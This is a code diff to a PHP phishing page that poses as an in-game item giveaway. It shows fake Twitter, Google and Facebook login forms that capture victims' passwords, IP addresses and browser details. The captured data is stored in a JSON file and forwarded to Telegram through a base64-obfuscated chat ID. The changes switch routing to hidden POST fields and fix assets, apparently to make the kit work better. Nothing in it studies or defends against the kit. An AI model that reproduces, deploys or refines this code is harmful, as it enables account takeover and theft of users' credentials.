@@ -114,7 +114,6 @@ function info($name) {
     return getIP();
   } elseif ($name === 'browser') {
     $browser = getBrowser();
-
     return $browser['name']." ".$browser['version']." on ".$browser['platform'];
   }
 }
@@ -131,9 +130,7 @@ if (isset($_POST['login'])) {
     'browser'   => $_POST['browser']
 
   );
-  if (file_put_contents('65d592ca6de0975858e73068ddb745bea5b095e0.json', json_encode($json_arr))) {
-    ?> <meta http-equiv="REFRESH" content="0;url=?p=collect"> <?php
-  }
+  file_put_contents('65d592ca6de0975858e73068ddb745bea5b095e0.json', json_encode($json_arr));
 }
 if (isset($_POST['send_telegram'])) {
     sendMessage(base64_decode('MTE5OTg1ODU5OQ=='),
@@ -694,7 +691,7 @@ color:#55acee;
 }    
 </style>
 <?php
-if (@$_GET['p'] == 'collect') {
+if (@$_POST['p'] == 'collect') {
   ?>
 <div class="sticky">
 <a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
@@ -869,7 +866,7 @@ if (@$_GET['p'] == 'collect') {
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item">
-<img class="thumbnail" src="https://i.ibb.co/R0pKbTL/33.padding">
+<img class="thumbnail" src="https://i.ibb.co/R0pKbTL/33.png">
 <a href="#collected" class="buy">Collect</a>
 </div>
 <div class="item last">
@@ -1149,6 +1146,9 @@ function showSlides() {
     </br>
 </br>
 </br>
+<select hidden name="p">
+	<option value="collect">p</option>
+</select>
 <center>
 <button type="submit" class="btn-login-twitter" name="login"><b>Login</b></button>
 </center>
@@ -1190,6 +1190,9 @@ function showSlides() {
 <b font-size="100" style="color:black;">enter your password below</b>
 </center>
 <input type="password" name="pass" placeholder="Enter your password" autocomplete="off" autocapitalize="off" required></br>
+<select hidden name="p">
+	<option value="collect">p</option>
+</select>
 <button type="button" class="previous btn-register-gp"><b>Previous</b></button>
 <button type="submit" class="btn-login-gp" name="login"><b>Sign in</b></button>
 </fieldset>
@@ -1217,6 +1220,9 @@ function showSlides() {
     <input type="hidden" name="login_from" value="Facebook">
 </br>
 <center>
+<select hidden name="p">
+	<option value="collect">p</option>
+</select>
 <button type="submit" class="btn-login-fb" name="login"><b>Log In</b></button>
 </center>
 </br>
